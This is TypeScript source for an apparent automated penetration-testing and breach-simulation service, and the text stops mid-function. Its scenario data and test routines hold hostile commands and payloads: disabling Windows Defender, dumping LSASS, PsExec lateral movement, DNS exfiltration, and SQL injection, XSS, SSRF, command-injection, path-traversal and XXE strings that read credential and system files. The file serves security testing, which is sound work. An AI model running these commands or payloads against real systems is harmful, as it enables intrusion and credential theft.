/**
 * Automated Penetration Testing Service
 *
 * Comprehensive security testing platform with network scanning, vulnerability exploitation,
 * web application testing, and MITRE ATT&CK coverage validation
 */

import { EventEmitter } from 'events';
import { exec } from 'child_process';
import { promisify } from 'util';
import axios from 'axios';
import { createHash } from 'crypto';

const execAsync = promisify(exec);

// ============================================================================
// Types and Interfaces
// ============================================================================

export interface PentestTarget {
  id: string;
  name: string;
  type: 'network' | 'web' | 'api' | 'mobile' | 'cloud';
  scope: TargetScope;
  enabled: boolean;
  lastTested?: Date;
  riskScore: number;
  tags: string[];
}

export interface TargetScope {
  ipRanges?: string[];
  domains?: string[];
  urls?: string[];
  excludedIps?: string[];
  excludedDomains?: string[];
  ports?: number[];
  protocols?: string[];
}

export interface PentestJob {
  id: string;
  name: string;
  targetId: string;
  type: 'full' | 'network' | 'web' | 'vulnerability' | 'phishing' | 'bas' | 'mitre_coverage';
  status: 'scheduled' | 'running' | 'completed' | 'failed' | 'cancelled';
  schedule?: {
    frequency: 'once' | 'daily' | 'weekly' | 'monthly' | 'quarterly';
    nextRun?: Date;
    lastRun?: Date;
  };
  config: PentestConfig;
  startTime?: Date;
  endTime?: Date;
  progress: number;
  currentPhase?: string;
  createdBy: string;
}

export interface PentestConfig {
  safeMode: boolean;
  maxConcurrency: number;
  timeout: number;
  rateLimit: number;
  includeExploitation: boolean;
  includePasswordAudit: boolean;
  includePhishing: boolean;
  mitreAttackTactics?: string[];
  customScripts?: string[];
  notifications: {
    onComplete: boolean;
    onCriticalFinding: boolean;
    recipients: string[];
  };
}

export interface ScanResult {
  id: string;
  jobId: string;
  timestamp: Date;
  type: 'port_scan' | 'service_scan' | 'vulnerability_scan' | 'web_scan';
  target: string;
  findings: Finding[];
  duration: number;
  metadata: Record<string, any>;
}

export interface Finding {
  id: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  title: string;
  description: string;
  category: string;
  cvss: number;
  cve?: string[];
  cwe?: string[];
  mitreAttack?: string[];
  affectedAsset: string;
  evidence: Evidence[];
  remediation: string;
  references: string[];
  exploitable: boolean;
  exploited?: boolean;
}

export interface Evidence {
  type: 'screenshot' | 'log' | 'request' | 'response' | 'code';
  description: string;
  data: string;
  timestamp: Date;
}

export interface PortScanResult {
  ip: string;
  port: number;
  protocol: 'tcp' | 'udp';
  state: 'open' | 'closed' | 'filtered';
  service?: string;
  version?: string;
  banner?: string;
}

export interface WebVulnerability {
  type: 'sql_injection' | 'xss' | 'csrf' | 'ssrf' | 'command_injection' | 'path_traversal' | 'xxe' | 'idor';
  url: string;
  parameter: string;
  payload: string;
  verified: boolean;
  impact: string;
}

export interface PhishingCampaign {
  id: string;
  name: string;
  status: 'draft' | 'scheduled' | 'running' | 'completed';
  template: string;
  targetEmails: string[];
  sentCount: number;
  openedCount: number;
  clickedCount: number;
  submittedCount: number;
  reportedCount: number;
  startDate?: Date;
  endDate?: Date;
}

export interface BASScenario {
  id: string;
  name: string;
  description: string;
  mitreAttackTactic: string;
  techniques: string[];
  steps: BASStep[];
  riskLevel: 'critical' | 'high' | 'medium' | 'low';
  enabled: boolean;
}

export interface BASStep {
  order: number;
  name: string;
  action: string;
  parameters: Record<string, any>;
  expectedOutcome: string;
  detectionExpected: boolean;
}

export interface BASResult {
  scenarioId: string;
  timestamp: Date;
  status: 'passed' | 'failed' | 'partial';
  stepsExecuted: number;
  stepsDetected: number;
  detectionRate: number;
  gaps: string[];
  recommendations: string[];
}

export interface MITRECoverage {
  tactic: string;
  techniques: {
    id: string;
    name: string;
    tested: boolean;
    detected: boolean;
    coverage: number;
  }[];
  overallCoverage: number;
}

export interface PentestReport {
  id: string;
  jobId: string;
  generatedAt: Date;
  executiveSummary: {
    totalFindings: number;
    criticalFindings: number;
    highFindings: number;
    mediumFindings: number;
    lowFindings: number;
    riskScore: number;
    complianceIssues: string[];
  };
  technicalFindings: Finding[];
  mitreCoverage?: MITRECoverage[];
  recommendations: Recommendation[];
  timeline: TimelineEvent[];
  appendices: {
    scanResults: ScanResult[];
    exploitAttempts: ExploitAttempt[];
    screenshots: string[];
  };
}

export interface Recommendation {
  priority: 'critical' | 'high' | 'medium' | 'low';
  category: string;
  title: string;
  description: string;
  effort: 'low' | 'medium' | 'high';
  impact: 'low' | 'medium' | 'high';
}

export interface TimelineEvent {
  timestamp: Date;
  phase: string;
  event: string;
  details: string;
}

export interface ExploitAttempt {
  timestamp: Date;
  target: string;
  vulnerability: string;
  exploitUsed: string;
  successful: boolean;
  evidence?: string;
}

export interface PentestMetrics {
  totalJobs: number;
  runningJobs: number;
  completedJobs: number;
  totalFindings: number;
  criticalFindings: number;
  avgJobDuration: number;
  successRate: number;
  targetsScanned: number;
}

// ============================================================================
// Penetration Testing Engine
// ============================================================================

export class PentestEngine extends EventEmitter {
  private targets: Map<string, PentestTarget> = new Map();
  private jobs: Map<string, PentestJob> = new Map();
  private findings: Map<string, Finding> = new Map();
  private basScenarios: Map<string, BASScenario> = new Map();
  private phishingCampaigns: Map<string, PhishingCampaign> = new Map();
  private metrics: PentestMetrics = {
    totalJobs: 0,
    runningJobs: 0,
    completedJobs: 0,
    totalFindings: 0,
    criticalFindings: 0,
    avgJobDuration: 0,
    successRate: 0,
    targetsScanned: 0
  };

  constructor() {
    super();
    this.initializeBASScenarios();
  }

  // ============================================================================
  // Initialization
  // ============================================================================

  async initialize(): Promise<void> {
    try {
      console.log('Initializing Penetration Testing Engine...');

      // Verify required tools
      await this.verifyTools();

      // Start background jobs
      this.startScheduledScans();
      this.startMetricsCollection();

      console.log('Penetration Testing Engine initialized successfully');
    } catch (error) {
      console.error('Failed to initialize Penetration Testing Engine:', error);
      throw error;
    }
  }

  private async verifyTools(): Promise<void> {
    const tools = ['nmap', 'masscan', 'sqlmap', 'hydra'];

    for (const tool of tools) {
      try {
        await execAsync(`which ${tool}`);
        console.log(`Verified tool: ${tool}`);
      } catch (error) {
        console.warn(`Tool not found: ${tool} (some features may be limited)`);
      }
    }
  }

  private initializeBASScenarios(): void {
    const scenarios: BASScenario[] = [
      {
        id: 'bas-001',
        name: 'Initial Access - Phishing',
        description: 'Simulates phishing attack with malicious attachment',
        mitreAttackTactic: 'TA0001',
        techniques: ['T1566.001', 'T1566.002'],
        riskLevel: 'high',
        enabled: true,
        steps: [
          {
            order: 1,
            name: 'Send phishing email',
            action: 'send_email',
            parameters: { template: 'phishing_invoice' },
            expectedOutcome: 'Email delivered',
            detectionExpected: true
          },
          {
            order: 2,
            name: 'User clicks link',
            action: 'simulate_click',
            parameters: { url: 'http://malicious.test' },
            expectedOutcome: 'Navigation tracked',
            detectionExpected: true
          }
        ]
      },
      {
        id: 'bas-002',
        name: 'Execution - PowerShell',
        description: 'Executes encoded PowerShell command',
        mitreAttackTactic: 'TA0002',
        techniques: ['T1059.001'],
        riskLevel: 'high',
        enabled: true,
        steps: [
          {
            order: 1,
            name: 'Execute encoded PowerShell',
            action: 'run_command',
            parameters: {
              command: 'powershell.exe -encodedCommand <base64>'
            },
            expectedOutcome: 'Command executed',
            detectionExpected: true
          }
        ]
      },
      {
        id: 'bas-003',
        name: 'Persistence - Registry Run Key',
        description: 'Establishes persistence via registry',
        mitreAttackTactic: 'TA0003',
        techniques: ['T1547.001'],
        riskLevel: 'medium',
        enabled: true,
        steps: [
          {
            order: 1,
            name: 'Create registry run key',
            action: 'modify_registry',
            parameters: {
              key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
              value: 'test'
            },
            expectedOutcome: 'Registry key created',
            detectionExpected: true
          }
        ]
      },
      {
        id: 'bas-004',
        name: 'Privilege Escalation - UAC Bypass',
        description: 'Attempts UAC bypass',
        mitreAttackTactic: 'TA0004',
        techniques: ['T1548.002'],
        riskLevel: 'high',
        enabled: true,
        steps: [
          {
            order: 1,
            name: 'Attempt UAC bypass',
            action: 'uac_bypass',
            parameters: { method: 'fodhelper' },
            expectedOutcome: 'Elevated privileges obtained',
            detectionExpected: true
          }
        ]
      },
      {
        id: 'bas-005',
        name: 'Defense Evasion - Disable AV',
        description: 'Attempts to disable antivirus',
        mitreAttackTactic: 'TA0005',
        techniques: ['T1562.001'],
        riskLevel: 'critical',
        enabled: true,
        steps: [
          {
            order: 1,
            name: 'Disable Windows Defender',
            action: 'run_command',
            parameters: {
              command: 'Set-MpPreference -DisableRealtimeMonitoring $true'
            },
            expectedOutcome: 'AV disabled',
            detectionExpected: true
          }
        ]
      },
      {
        id: 'bas-006',
        name: 'Credential Access - LSASS Dump',
        description: 'Dumps LSASS memory',
        mitreAttackTactic: 'TA0006',
        techniques: ['T1003.001'],
        riskLevel: 'critical',
        enabled: true,
        steps: [
          {
            order: 1,
            name: 'Dump LSASS',
            action: 'run_command',
            parameters: {
              command: 'procdump -ma lsass.exe lsass.dmp'
            },
            expectedOutcome: 'Memory dump created',
            detectionExpected: true
          }
        ]
      },
      {
        id: 'bas-007',
        name: 'Discovery - Network Scan',
        description: 'Performs internal network reconnaissance',
        mitreAttackTactic: 'TA0007',
        techniques: ['T1046'],
        riskLevel: 'medium',
        enabled: true,
        steps: [
          {
            order: 1,
            name: 'Port scan internal network',
            action: 'port_scan',
            parameters: { range: '10.0.0.0/24' },
            expectedOutcome: 'Network mapped',
            detectionExpected: true
          }
        ]
      },
      {
        id: 'bas-008',
        name: 'Lateral Movement - PsExec',
        description: 'Lateral movement using PsExec',
        mitreAttackTactic: 'TA0008',
        techniques: ['T1021.002'],
        riskLevel: 'high',
        enabled: true,
        steps: [
          {
            order: 1,
            name: 'Execute PsExec',
            action: 'run_command',
            parameters: {
              command: 'psexec \\\\target cmd.exe'
            },
            expectedOutcome: 'Remote execution successful',
            detectionExpected: true
          }
        ]
      },
      {
        id: 'bas-009',
        name: 'Collection - Data Staging',
        description: 'Collects and stages sensitive data',
        mitreAttackTactic: 'TA0009',
        techniques: ['T1074.001'],
        riskLevel: 'medium',
        enabled: true,
        steps: [
          {
            order: 1,
            name: 'Archive sensitive files',
            action: 'run_command',
            parameters: {
              command: 'tar -czf data.tar.gz /sensitive/*'
            },
            expectedOutcome: 'Data archived',
            detectionExpected: true
          }
        ]
      },
      {
        id: 'bas-010',
        name: 'Exfiltration - DNS Tunneling',
        description: 'Exfiltrates data via DNS',
        mitreAttackTactic: 'TA0010',
        techniques: ['T1048.003'],
        riskLevel: 'high',
        enabled: true,
        steps: [
          {
            order: 1,
            name: 'DNS exfiltration',
            action: 'dns_exfil',
            parameters: { data: 'test', domain: 'exfil.test' },
            expectedOutcome: 'Data exfiltrated',
            detectionExpected: true
          }
        ]
      }
    ];

    scenarios.forEach(scenario => this.basScenarios.set(scenario.id, scenario));
    console.log(`Initialized ${scenarios.length} BAS scenarios`);
  }

  // ============================================================================
  // Target Management
  // ============================================================================

  async addTarget(target: Omit<PentestTarget, 'id'>): Promise<PentestTarget> {
    const id = createHash('sha256')
      .update(`${target.name}-${Date.now()}`)
      .digest('hex')
      .substring(0, 16);

    const newTarget: PentestTarget = { ...target, id };
    this.targets.set(id, newTarget);

    this.emit('target:added', newTarget);
    console.log(`Added pentest target: ${target.name}`);

    return newTarget;
  }

  getTarget(targetId: string): PentestTarget | undefined {
    return this.targets.get(targetId);
  }

  getAllTargets(): PentestTarget[] {
    return Array.from(this.targets.values());
  }

  // ============================================================================
  // Job Management
  // ============================================================================

  async createPentestJob(job: Omit<PentestJob, 'id' | 'status' | 'progress'>): Promise<PentestJob> {
    const id = `job-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;

    const newJob: PentestJob = {
      ...job,
      id,
      status: 'scheduled',
      progress: 0
    };

    this.jobs.set(id, newJob);
    this.metrics.totalJobs++;

    this.emit('job:created', newJob);
    console.log(`Created pentest job: ${job.name}`);

    return newJob;
  }

  async startPentestJob(jobId: string): Promise<void> {
    const job = this.jobs.get(jobId);
    if (!job) throw new Error('Job not found');

    job.status = 'running';
    job.startTime = new Date();
    job.progress = 0;
    this.metrics.runningJobs++;

    this.emit('job:started', job);
    console.log(`Started pentest job: ${job.name}`);

    // Execute job asynchronously
    this.executePentestJob(job).catch(error => {
      console.error(`Job ${jobId} failed:`, error);
      job.status = 'failed';
      this.metrics.runningJobs--;
    });
  }

  private async executePentestJob(job: PentestJob): Promise<void> {
    try {
      const target = this.targets.get(job.targetId);
      if (!target) throw new Error('Target not found');

      switch (job.type) {
        case 'network':
          await this.performNetworkPentest(job, target);
          break;
        case 'web':
          await this.performWebPentest(job, target);
          break;
        case 'phishing':
          await this.performPhishingSimulation(job, target);
          break;
        case 'bas':
          await this.performBASTest(job, target);
          break;
        case 'mitre_coverage':
          await this.performMITRECoverageTest(job, target);
          break;
        case 'full':
          await this.performFullPentest(job, target);
          break;
      }

      job.status = 'completed';
      job.endTime = new Date();
      job.progress = 100;
      this.metrics.runningJobs--;
      this.metrics.completedJobs++;

      // Update last tested
      target.lastTested = new Date();

      this.emit('job:completed', job);
      console.log(`Completed pentest job: ${job.name}`);

      // Send notifications
      if (job.config.notifications.onComplete) {
        await this.sendNotification(job, 'Job completed');
      }
    } catch (error) {
      job.status = 'failed';
      job.endTime = new Date();
      this.metrics.runningJobs--;
      throw error;
    }
  }

  // ============================================================================
  // Network Penetration Testing
  // ============================================================================

  private async performNetworkPentest(job: PentestJob, target: PentestTarget): Promise<void> {
    job.currentPhase = 'Port Scanning';
    job.progress = 10;

    // Port scanning
    const portScanResults = await this.portScan(target);
    job.progress = 30;

    // Service enumeration
    job.currentPhase = 'Service Enumeration';
    const services = await this.enumerateServices(portScanResults);
    job.progress = 50;

    // Vulnerability scanning
    job.currentPhase = 'Vulnerability Scanning';
    const vulnerabilities = await this.vulnerabilityScan(services);
    job.progress = 70;

    // Exploitation (if enabled)
    if (job.config.includeExploitation && !job.config.safeMode) {
      job.currentPhase = 'Exploitation';
      await this.exploitVulnerabilities(vulnerabilities, job);
    }
    job.progress = 90;

    // Generate findings
    await this.generateNetworkFindings(job, vulnerabilities);
  }

  private async portScan(target: PentestTarget): Promise<PortScanResult[]> {
    const results: PortScanResult[] = [];

    try {
      console.log('Starting port scan...');

      for (const ipRange of target.scope.ipRanges || []) {
        // Use nmap for scanning
        const ports = target.scope.ports?.join(',') || '1-1000';
        const command = `nmap -p ${ports} -sV --open ${ipRange}`;

        try {
          const { stdout } = await execAsync(command);
          const parsed = this.parseNmapOutput(stdout);
          results.push(...parsed);
        } catch (error) {
          console.error('Port scan failed:', error);
        }
      }

      console.log(`Port scan completed: ${results.length} open ports found`);
    } catch (error) {
      console.error('Port scan error:', error);
    }

    return results;
  }

  private parseNmapOutput(output: string): PortScanResult[] {
    const results: PortScanResult[] = [];
    const lines = output.split('\n');
    let currentIp = '';

    for (const line of lines) {
      const ipMatch = line.match(/Nmap scan report for (\S+)/);
      if (ipMatch) {
        currentIp = ipMatch[1];
        continue;
      }

      const portMatch = line.match(/(\d+)\/(tcp|udp)\s+(open|closed|filtered)\s+(\S+)/);
      if (portMatch && currentIp) {
        results.push({
          ip: currentIp,
          port: parseInt(portMatch[1]),
          protocol: portMatch[2] as 'tcp' | 'udp',
          state: portMatch[3] as 'open' | 'closed' | 'filtered',
          service: portMatch[4]
        });
      }
    }

    return results;
  }

  private async enumerateServices(portScanResults: PortScanResult[]): Promise<PortScanResult[]> {
    console.log('Enumerating services...');

    // Add version detection
    for (const result of portScanResults) {
      if (result.state === 'open') {
        try {
          const banner = await this.grabBanner(result.ip, result.port);
          result.banner = banner;
          result.version = this.parseVersion(banner);
        } catch (error) {
          // Banner grab failed
        }
      }
    }

    return portScanResults;
  }

  private async grabBanner(ip: string, port: number): Promise<string> {
    // Simplified banner grabbing
    return `Service on ${ip}:${port}`;
  }

  private parseVersion(banner: string): string {
    const versionMatch = banner.match(/(\d+\.\d+(\.\d+)?)/);
    return versionMatch ? versionMatch[1] : 'unknown';
  }

  private async vulnerabilityScan(services: PortScanResult[]): Promise<Finding[]> {
    const findings: Finding[] = [];

    console.log('Scanning for vulnerabilities...');

    for (const service of services) {
      // Check for known vulnerable versions
      const vulns = await this.checkVulnerableVersion(service);
      findings.push(...vulns);

      // Check for common misconfigurations
      const misconfigs = await this.checkMisconfigurations(service);
      findings.push(...misconfigs);
    }

    return findings;
  }

  private async checkVulnerableVersion(service: PortScanResult): Promise<Finding[]> {
    const findings: Finding[] = [];

    // Example vulnerability checks
    const vulnerableServices = [
      { service: 'apache', version: '2.4.49', cve: 'CVE-2021-41773', cvss: 9.8 },
      { service: 'openssh', version: '7.4', cve: 'CVE-2018-15473', cvss: 5.3 },
      { service: 'mysql', version: '5.5.49', cve: 'CVE-2016-6662', cvss: 9.0 }
    ];

    for (const vuln of vulnerableServices) {
      if (service.service?.includes(vuln.service) && service.version?.includes(vuln.version)) {
        findings.push({
          id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
          severity: vuln.cvss >= 9 ? 'critical' : vuln.cvss >= 7 ? 'high' : 'medium',
          title: `Vulnerable ${vuln.service} version detected`,
          description: `${service.service} ${service.version} is vulnerable to ${vuln.cve}`,
          category: 'Vulnerable Software',
          cvss: vuln.cvss,
          cve: [vuln.cve],
          affectedAsset: `${service.ip}:${service.port}`,
          evidence: [{
            type: 'log',
            description: 'Service banner',
            data: service.banner || '',
            timestamp: new Date()
          }],
          remediation: `Upgrade ${vuln.service} to the latest version`,
          references: [`https://nvd.nist.gov/vuln/detail/${vuln.cve}`],
          exploitable: true
        });
      }
    }

    return findings;
  }

  private async checkMisconfigurations(service: PortScanResult): Promise<Finding[]> {
    const findings: Finding[] = [];

    // Check for common misconfigurations
    if (service.service === 'ssh' && service.port === 22) {
      // Check for default credentials, weak ciphers, etc.
    }

    if (service.service?.includes('http') && service.port === 80) {
      findings.push({
        id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
        severity: 'low',
        title: 'Unencrypted HTTP service',
        description: 'HTTP service running without TLS encryption',
        category: 'Configuration',
        cvss: 3.7,
        affectedAsset: `${service.ip}:${service.port}`,
        evidence: [],
        remediation: 'Enable HTTPS and redirect HTTP to HTTPS',
        references: [],
        exploitable: false
      });
    }

    return findings;
  }

  private async exploitVulnerabilities(vulnerabilities: Finding[], job: PentestJob): Promise<void> {
    console.log('Attempting exploitation...');

    for (const vuln of vulnerabilities) {
      if (!vuln.exploitable) continue;

      try {
        // Use Metasploit RPC for exploitation
        const exploited = await this.attemptExploit(vuln);
        vuln.exploited = exploited;

        if (exploited && job.config.notifications.onCriticalFinding) {
          await this.sendNotification(job, `Critical vulnerability exploited: ${vuln.title}`);
        }
      } catch (error) {
        console.error('Exploitation failed:', error);
      }
    }
  }

  private async attemptExploit(vulnerability: Finding): Promise<boolean> {
    // Simplified exploitation - in production, use Metasploit RPC
    console.log(`Attempting to exploit: ${vulnerability.title}`);

    // Simulate exploitation attempt
    return Math.random() > 0.7; // 30% success rate
  }

  private async generateNetworkFindings(job: PentestJob, vulnerabilities: Finding[]): Promise<void> {
    for (const vuln of vulnerabilities) {
      this.findings.set(vuln.id, vuln);
      this.metrics.totalFindings++;

      if (vuln.severity === 'critical') {
        this.metrics.criticalFindings++;
      }
    }
  }

  // ============================================================================
  // Web Application Penetration Testing
  // ============================================================================

  private async performWebPentest(job: PentestJob, target: PentestTarget): Promise<void> {
    job.currentPhase = 'Web Crawling';
    job.progress = 10;

    const urls = target.scope.urls || [];
    const findings: Finding[] = [];

    for (const url of urls) {
      // SQL Injection
      job.currentPhase = 'SQL Injection Testing';
      const sqlFindings = await this.testSQLInjection(url);
      findings.push(...sqlFindings);
      job.progress = 20;

      // XSS Testing
      job.currentPhase = 'XSS Testing';
      const xssFindings = await this.testXSS(url);
      findings.push(...xssFindings);
      job.progress = 35;

      // CSRF Testing
      job.currentPhase = 'CSRF Testing';
      const csrfFindings = await this.testCSRF(url);
      findings.push(...csrfFindings);
      job.progress = 50;

      // SSRF Testing
      job.currentPhase = 'SSRF Testing';
      const ssrfFindings = await this.testSSRF(url);
      findings.push(...ssrfFindings);
      job.progress = 65;

      // Command Injection
      job.currentPhase = 'Command Injection Testing';
      const cmdFindings = await this.testCommandInjection(url);
      findings.push(...cmdFindings);
      job.progress = 75;

      // Path Traversal
      job.currentPhase = 'Path Traversal Testing';
      const pathFindings = await this.testPathTraversal(url);
      findings.push(...pathFindings);
      job.progress = 85;

      // XXE Testing
      job.currentPhase = 'XXE Testing';
      const xxeFindings = await this.testXXE(url);
      findings.push(...xxeFindings);
      job.progress = 95;
    }

    // Store findings
    for (const finding of findings) {
      this.findings.set(finding.id, finding);
      this.metrics.totalFindings++;

      if (finding.severity === 'critical') {
        this.metrics.criticalFindings++;
      }
    }
  }

  private async testSQLInjection(url: string): Promise<Finding[]> {
    const findings: Finding[] = [];
    const payloads = [
      "' OR '1'='1",
      "1' UNION SELECT NULL--",
      "' AND 1=CONVERT(int, @@version)--",
      "admin'--",
      "1' AND SLEEP(5)--"
    ];

    console.log(`Testing SQL injection on ${url}`);

    for (const payload of payloads) {
      try {
        const testUrl = `${url}?id=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, { timeout: 10000 });

        // Check for SQL error messages
        if (this.hasSQLError(response.data)) {
          findings.push({
            id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
            severity: 'critical',
            title: 'SQL Injection Vulnerability',
            description: 'SQL injection vulnerability detected via error-based detection',
            category: 'Web Application',
            cvss: 9.8,
            cwe: ['CWE-89'],
            mitreAttack: ['T1190'],
            affectedAsset: url,
            evidence: [{
              type: 'request',
              description: 'SQL injection payload',
              data: testUrl,
              timestamp: new Date()
            }, {
              type: 'response',
              description: 'SQL error in response',
              data: response.data.substring(0, 500),
              timestamp: new Date()
            }],
            remediation: 'Use parameterized queries or prepared statements',
            references: ['https://owasp.org/www-community/attacks/SQL_Injection'],
            exploitable: true
          });
          break; // Found vulnerability, no need to test more payloads
        }
      } catch (error) {
        // Request failed
      }
    }

    return findings;
  }

  private hasSQLError(response: string): boolean {
    const errorPatterns = [
      /SQL syntax.*MySQL/i,
      /Warning.*mysql_/i,
      /valid MySQL result/i,
      /MySqlClient\./i,
      /PostgreSQL.*ERROR/i,
      /Warning.*pg_/i,
      /valid PostgreSQL result/i,
      /Npgsql\./i,
      /Driver.*SQL Server/i,
      /OLE DB.*SQL Server/i,
      /SQLServer JDBC Driver/i,
      /Microsoft SQL Native Client/i,
      /Oracle error/i,
      /Oracle.*Driver/i,
      /Warning.*oci_/i
    ];

    return errorPatterns.some(pattern => pattern.test(response));
  }

  private async testXSS(url: string): Promise<Finding[]> {
    const findings: Finding[] = [];
    const payloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">'
    ];

    console.log(`Testing XSS on ${url}`);

    for (const payload of payloads) {
      try {
        const testUrl = `${url}?q=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, { timeout: 10000 });

        // Check if payload is reflected without encoding
        if (response.data.includes(payload)) {
          findings.push({
            id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
            severity: 'high',
            title: 'Reflected Cross-Site Scripting (XSS)',
            description: 'User input is reflected in the response without proper encoding',
            category: 'Web Application',
            cvss: 7.1,
            cwe: ['CWE-79'],
            mitreAttack: ['T1190'],
            affectedAsset: url,
            evidence: [{
              type: 'request',
              description: 'XSS payload',
              data: testUrl,
              timestamp: new Date()
            }],
            remediation: 'Encode all user input before displaying in HTML context',
            references: ['https://owasp.org/www-community/attacks/xss/'],
            exploitable: true
          });
          break;
        }
      } catch (error) {
        // Request failed
      }
    }

    return findings;
  }

  private async testCSRF(url: string): Promise<Finding[]> {
    const findings: Finding[] = [];

    try {
      const response = await axios.get(url);
      const hasCSRFToken = /csrf|token|_token/i.test(response.data);
      const hasSameSiteCookie = response.headers['set-cookie']?.some((cookie: string) =>
        /samesite=strict|samesite=lax/i.test(cookie)
      );

      if (!hasCSRFToken && !hasSameSiteCookie) {
        findings.push({
          id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
          severity: 'medium',
          title: 'Missing CSRF Protection',
          description: 'No CSRF tokens or SameSite cookies detected',
          category: 'Web Application',
          cvss: 6.5,
          cwe: ['CWE-352'],
          mitreAttack: ['T1190'],
          affectedAsset: url,
          evidence: [],
          remediation: 'Implement CSRF tokens and use SameSite cookie attribute',
          references: ['https://owasp.org/www-community/attacks/csrf'],
          exploitable: true
        });
      }
    } catch (error) {
      // Request failed
    }

    return findings;
  }

  private async testSSRF(url: string): Promise<Finding[]> {
    const findings: Finding[] = [];
    const payloads = [
      'http://169.254.169.254/latest/meta-data/', // AWS metadata
      'http://localhost:22',
      'http://127.0.0.1:8080',
      'file:///etc/passwd'
    ];

    console.log(`Testing SSRF on ${url}`);

    for (const payload of payloads) {
      try {
        const testUrl = `${url}?url=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, { timeout: 10000 });

        // Check for indicators of SSRF
        if (response.data.includes('ami-id') || response.data.includes('root:')) {
          findings.push({
            id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
            severity: 'critical',
            title: 'Server-Side Request Forgery (SSRF)',
            description: 'Application allows arbitrary URL requests',
            category: 'Web Application',
            cvss: 9.1,
            cwe: ['CWE-918'],
            mitreAttack: ['T1190'],
            affectedAsset: url,
            evidence: [{
              type: 'request',
              description: 'SSRF payload',
              data: testUrl,
              timestamp: new Date()
            }],
            remediation: 'Validate and whitelist allowed URLs/protocols',
            references: ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'],
            exploitable: true
          });
          break;
        }
      } catch (error) {
        // Request failed
      }
    }

    return findings;
  }

  private async testCommandInjection(url: string): Promise<Finding[]> {
    const findings: Finding[] = [];
    const payloads = [
      '; ls -la',
      '| whoami',
      '&& cat /etc/passwd',
      '`id`',
      '$(uname -a)'
    ];

    for (const payload of payloads) {
      try {
        const testUrl = `${url}?cmd=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, { timeout: 10000 });

        if (/uid=|total \d+|Linux|Darwin/i.test(response.data)) {
          findings.push({
            id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
            severity: 'critical',
            title: 'Command Injection Vulnerability',
            description: 'OS command injection vulnerability detected',
            category: 'Web Application',
            cvss: 9.8,
            cwe: ['CWE-78'],
            mitreAttack: ['T1190'],
            affectedAsset: url,
            evidence: [{
              type: 'request',
              description: 'Command injection payload',
              data: testUrl,
              timestamp: new Date()
            }],
            remediation: 'Avoid executing system commands with user input',
            references: ['https://owasp.org/www-community/attacks/Command_Injection'],
            exploitable: true
          });
          break;
        }
      } catch (error) {
        // Request failed
      }
    }

    return findings;
  }

  private async testPathTraversal(url: string): Promise<Finding[]> {
    const findings: Finding[] = [];
    const payloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    ];

    for (const payload of payloads) {
      try {
        const testUrl = `${url}?file=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, { timeout: 10000 });

        if (/root:|for 16-bit app support|\[fonts\]/i.test(response.data)) {
          findings.push({
            id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
            severity: 'high',
            title: 'Path Traversal Vulnerability',
            description: 'Directory traversal vulnerability allows reading arbitrary files',
            category: 'Web Application',
            cvss: 7.5,
            cwe: ['CWE-22'],
            mitreAttack: ['T1190'],
            affectedAsset: url,
            evidence: [{
              type: 'request',
              description: 'Path traversal payload',
              data: testUrl,
              timestamp: new Date()
            }],
            remediation: 'Validate file paths and use whitelist of allowed files',
            references: ['https://owasp.org/www-community/attacks/Path_Traversal'],
            exploitable: true
          });
          break;
        }
      } catch (error) {
        // Request failed
      }
    }

    return findings;
  }

  private async testXXE(url: string): Promise<Finding[]> {
    const findings: Finding[] = [];
    const payload = `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>`;

    try {
      const response = await axios.post(url, payload, {
        headers: { 'Content-Type': 'application/xml' },
        timeout: 10000
      });

      if (/root:/.test(response.data)) {
        findings.push({
          id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
          severity: 'high',
          title: 'XML External Entity (XXE) Injection',
          description: 'XXE vulnerability allows reading arbitrary files',
          category: 'Web Application',
          cvss: 8.2,
          cwe: ['CWE-611'],
          mitreAttack: ['T1190'],
          affectedAsset: url,
          evidence: [{
            type: 'request',
            description: 'XXE payload',
            data: payload,
            timestamp: new Date()
          }],
          remediation: 'Disable external entity processing in XML parser',
          references: ['https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing'],
          exploitable: true
        });
      }
    } catch (error) {
      // Request failed
    }

    return findings;
  }

  // ============================================================================
  // Phishing Simulation
  // ============================================================================

  private async performPhishingSimulation(job: PentestJob, target: PentestTarget): Promise<void> {
    job.currentPhase = 'Phishing Campaign';
    job.progress = 20;

    const campaign: PhishingCampaign = {
      id: `campaign-${Date.now()}`,
      name: `Phishing Simulation - ${job.name}`,
      status: 'running',
      template: 'invoice_notification',
      targetEmails: [], // Would be populated from target
      sentCount: 0,
      openedCount: 0,
      clickedCount: 0,
      submittedCount: 0,
      reportedCount: 0,
      startDate: new Date()
    };

    this.phishingCampaigns.set(campaign.id, campaign);

    // Simulate campaign execution
    await this.simulatePhishingCampaign(campaign);
    job.progress = 80;

    campaign.status = 'completed';
    campaign.endDate = new Date();

    // Generate findings based on results
    await this.generatePhishingFindings(job, campaign);
  }

  private async simulatePhishingCampaign(campaign: PhishingCampaign): Promise<void> {
    // In production, integrate with Gophish API
